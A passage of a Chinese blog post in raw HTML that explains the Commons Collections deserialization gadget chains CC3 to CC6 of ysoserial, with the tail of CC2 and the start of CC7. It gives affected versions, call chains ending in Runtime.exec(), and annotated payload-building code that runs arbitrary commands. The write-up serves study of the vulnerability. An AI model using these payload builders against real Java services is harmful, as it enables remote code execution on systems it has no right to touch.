TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 假的方法名称 toString</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 transformer 构造 PriorityQueue</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 先设置正常的变量值</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改方法名称</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换队列内的变量</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates; <span class="comment">// jdk7u21</span></span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><blockquote><p>CC2(source) + CC1(sink)<br>利用 TemplatesImpl 承载恶意调用链<br>使用 InstantiateTransformer 代替 InvokerTransformer，通过 TrAXFilter 的构造方法调用 newTransformer<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk7u21<ul><li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                                Class.newInstance()</span><br><span class="line">                                    TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                            ClassLoader.defineClass()</span><br><span class="line">                                            Class.newInstance()</span><br><span class="line">                                              ...</span><br><span class="line">                                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                                ...</span><br><span class="line">                                                    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/RNrPcWsiQm2Ak8G.png"><p>InstantiateTransformer 的 transform 方法会创建类实例。TrAXFilter 类的构造函数接受 Templates 类型的参数，并执行 <code>TemplatesImpl.newTransformer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.CommonsCollections3#getObject 可以看出前面和 CC2 一样构造 templatesImpl 承载恶意代码，中间使用 InstantiateTransformer 构造链式触发器 ChainedTransformer，最后和 CC1 一样用 LazyMap 和 AnnotationInvocationHandler 动态代理封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImp 承载恶意代码</span></span><br><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同 CC1</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><blockquote><p>CC2 + CC3<br>利用 InstantiateTransformer 构造执行链</p></blockquote><p>适用版本</p><ul><li>commons-collections 4.0</li><li>jdk7u21<ul><li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InstantiateTransformer.transform()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        ClassLoader.defineClass()</span><br><span class="line">                                        Class.newInstance()</span><br><span class="line">                                          ...</span><br><span class="line">                                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                            ...</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/IkfLuarVRoy5Sni.png"><p>ysoserial.payloads.CommonsCollections4#getObject 用 ChainedTransformer 代替了 InvokerTransformer 作为比较器，且构造方式同 CC3，利用 InstantiateTransformer 触发。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">paramTypes, args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create queue with numbers</span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><blockquote><p>前面 RMI 反序列化漏洞利用中提到<br>将 CC1 中的 AnnotationInvocationHandler 替换为 BadAttributeValueExpException<br>利用 CC1 中的 LazyMap 构造 TiedMapEntry，再用于构造 BadAttributeValueExpException</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk 1.8</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/4tevUmukcFwMQT1.jpg" ><p>在 BadAttributeValueExpException 的 readObject 方法中，会调用成员变量 <code>val</code> 的 <code>toString</code> 方法</p><ul><li>这里将 <code>val</code> 设置为 TiedMapEntry</li><li>TiedMapEntry 会调用自身的 <code>getKey</code> 和 <code>getValue</code> 方法<ul><li><code>getKey</code> 方法中调用成员变量 map 的 <code>get</code> 方法</li><li>这里将 map 设置为 LazyMap（@CC1）</li></ul></li></ul><p>ysoserial.payloads.CommonsCollections5 注意这里利用反射设置 <code>val</code> 的值，因为 BadAttributeValueExpException 的构造函数会判断是否为空，如果不为空在序列化时就会执行 <code>toString()</code>，那么反序列化时，因为传入的 entry 已经是字符串，所以就不会触发 toString 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 BadAttributeValueExpException 的成员变量 val 设置为 TiedMapEntry</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 ChainedTransformer 中的 transformer 数组替换为恶意调用序列</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><blockquote><p>CC5 + CC1<br>通过对 TiedMapEntry#getValue 的调用触发 LazyMap#get<br>利用 ChainedTransformer 构造链式执行</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk 1.7</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        HashSet.readObject()</span><br><span class="line">            HashMap.put()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/jQaCHvLVX7IfBne.png" ><p>TiedMapEntry 中的 equals、hashCode、toString 方法中都调用了 TiedMapEntry#getValue，这里选择 hashCode 方法作为入口（CC5 用的是 toString）。</p><p>HashSet#readObject 反序列化时，会调用 map.put(e, PRESENT)方法，后续调用 HashMap#put，在其中会调用 HashMap#put 计算哈希值，最后触发 TiedMapEntry.hashCode；</p><p>map 可以控制为 HashMap，传入的第一个参数 e 是使用 readObject 读取，相应地在 writeObject 中写入的 e 是 map.keySet，因此通过反射修改 keySet 的返回结果为 TiedMapEntry。</p><p>ysoserial.payloads.CommonsCollections6#getObject 首先定义 ChainedTransformer 和 TiedMapEntry（同CC5），然后通过反射将 TiedMapEntry 赋值给 HashSet 的 keySet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line">    TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射修改 keySet 的返回结果为 TiedMapEntry</span></span><br><span class="line">    <span class="comment">// hashset 的 map 属性（HashMap）</span></span><br><span class="line">    HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);   <span class="comment">// 容量为 1</span></span><br><span class="line">    map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    Field f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f);</span><br><span class="line">    HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hashmap 的 table 属性（节点 node 数组）</span></span><br><span class="line">    Field f2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f2);</span><br><span class="line">    Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line">    <span class="comment">// 第一个节点</span></span><br><span class="line">    Object node = array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TiedMapEntry 存入 node 节点的 key</span></span><br><span class="line">    Field keyField = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(keyField);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><blockquote><p>和 CC6/CC5/CC1 类似，使用 ChainedTransformer 承载恶意代码<br>通过 AbstractMap#equals 来触发 LazyMap#get 方法的调用</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk 1.8</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    Hashtable.readObject</span><br><span class="line">        Hashtable.reconstitutionPut</span><br><span class="line">            AbstractMapDecorator.equals</span><br><span class="line">                AbstractMap.equals</span><br><span class="line">                    LazyMap.get</span><br><span class="line">                        ChainedTransformer.transform</span><br><span class="line">                            InvokerTransformer.transform</span><br><span class="line">                                Method.invoke</span><br><span class="line">                                DelegatingMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke0</span><br><span class="line">                                Runtime.exec</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/PAvzWR9u3k1VKSM.png" ><p>ysoserial.payloads.CommonsCollections7#getObject 首先构造 ChainedTransformer（同CC1），然后创建两个 LazyMap 作为 HashTable 的元素（<code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code>），最后将第二个 LazyMap 中的元素移除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 